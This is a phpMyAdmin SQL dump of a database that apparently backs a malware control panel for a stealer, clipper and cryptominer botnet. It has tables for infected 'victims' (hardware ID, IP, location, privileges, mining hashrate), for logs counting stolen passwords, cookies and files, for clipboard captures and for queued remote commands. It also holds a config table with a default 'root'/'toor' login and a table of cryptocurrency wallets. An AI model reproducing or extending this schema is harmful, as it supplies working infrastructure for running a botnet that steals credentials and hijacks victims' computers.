-- phpMyAdmin SQL Dump
-- version 4.8.2
-- https://www.phpmyadmin.net/
--
-- Хост: localhost
-- Час створення: Сер 11 2018 р., 18:07
-- Версія сервера: 5.6.40-84.0
-- Версія PHP: 5.5.38

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- База даних: `wm76211_main`
--

-- --------------------------------------------------------

--
-- Структура таблиці `clips`
--

CREATE TABLE `clips` (
  `id` int(11) NOT NULL,
  `hwid` varchar(255) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `type` varchar(255) NOT NULL,
  `text` varchar(255) NOT NULL,
  `country` varchar(255) NOT NULL,
  `date` int(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблиці `commands`
--

CREATE TABLE `commands` (
  `id` int(11) NOT NULL,
  `type` varchar(255) NOT NULL,
  `args` varchar(255) NOT NULL,
  `count` varchar(255) NOT NULL,
  `country` varchar(255) NOT NULL,
  `profile` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблиці `commands_done`
--

CREATE TABLE `commands_done` (
  `id` int(11) NOT NULL,
  `hwid` varchar(255) NOT NULL,
  `command` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблиці `config`
--

CREATE TABLE `config` (
  `login` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `start_delay` varchar(255) NOT NULL,
  `startup_delay` varchar(255) NOT NULL,
  `recover_interval` varchar(255) NOT NULL,
  `reconnect_interval` varchar(255) NOT NULL,
  `mining_status` varchar(255) NOT NULL,
  `warn_processes` varchar(255) NOT NULL,
  `warn_windows` varchar(255) NOT NULL,
  `exit_type` varchar(255) NOT NULL,
  `extensions` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Дамп даних таблиці `config`
--

INSERT INTO `config` (`login`, `password`, `start_delay`, `startup_delay`, `recover_interval`, `reconnect_interval`, `mining_status`, `warn_processes`, `warn_windows`, `exit_type`, `extensions`) VALUES
('root', 'toor', '5', '5', '5', '5', '1', '', '', '1', 'txt');

-- --------------------------------------------------------

--
-- Структура таблиці `logs`
--

CREATE TABLE `logs` (
  `id` int(11) NOT NULL,
  `hwid` varchar(255) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `country` varchar(255) NOT NULL,
  `pass` int(11) NOT NULL,
  `cookies` int(11) NOT NULL,
  `files` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблиці `victims`
--

CREATE TABLE `victims` (
  `id` int(11) NOT NULL,
  `hwid` varchar(255) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `country` varchar(255) NOT NULL,
  `latlng` varchar(255) NOT NULL,
  `os` varchar(255) NOT NULL,
  `cpu` varchar(255) NOT NULL,
  `gpu` varchar(255) NOT NULL,
  `aw` varchar(255) NOT NULL,
  `ram` varchar(256) NOT NULL,
  `drives` varchar(256) NOT NULL,
  `privileges` varchar(255) NOT NULL,
  `hashrate` float NOT NULL,
  `profile` varchar(255) NOT NULL,
  `install_date` int(50) NOT NULL,
  `last_response` int(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблиці `wallets`
--

CREATE TABLE `wallets` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `wallet` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Дамп даних таблиці `wallets`
--

INSERT INTO `wallets` (`id`, `name`, `wallet`) VALUES
(1, 'Bitcoin', 'wallet'),
(2, 'Ethereum', 'wallet'),
(3, 'Monero', 'wallet'),
(4, 'Litecoin', 'wallet'),
(5, 'Ripple', 'wallet'),
(6, 'Doge', 'wallet');

--
-- Індекси збережених таблиць
--

--
-- Індекси таблиці `clips`
--
ALTER TABLE `clips`
  ADD PRIMARY KEY (`id`);

--
-- Індекси таблиці `commands`
--
ALTER TABLE `commands`
  ADD PRIMARY KEY (`id`);

--
-- Індекси таблиці `commands_done`
--
ALTER TABLE `commands_done`
  ADD PRIMARY KEY (`id`);

--
-- Індекси таблиці `logs`
--
ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`);

--
-- Індекси таблиці `victims`
--
ALTER TABLE `victims`
  ADD PRIMARY KEY (`id`);

--
-- Індекси таблиці `wallets`
--
ALTER TABLE `wallets`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT для збережених таблиць
--

--
-- AUTO_INCREMENT для таблиці `clips`
--
ALTER TABLE `clips`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT для таблиці `commands`
--
ALTER TABLE `commands`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT для таблиці `commands_done`
--
ALTER TABLE `commands_done`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT для таблиці `logs`
--
ALTER TABLE `logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT для таблиці `victims`
--
ALTER TABLE `victims`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- AUTO_INCREMENT для таблиці `wallets`
--
ALTER TABLE `wallets`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
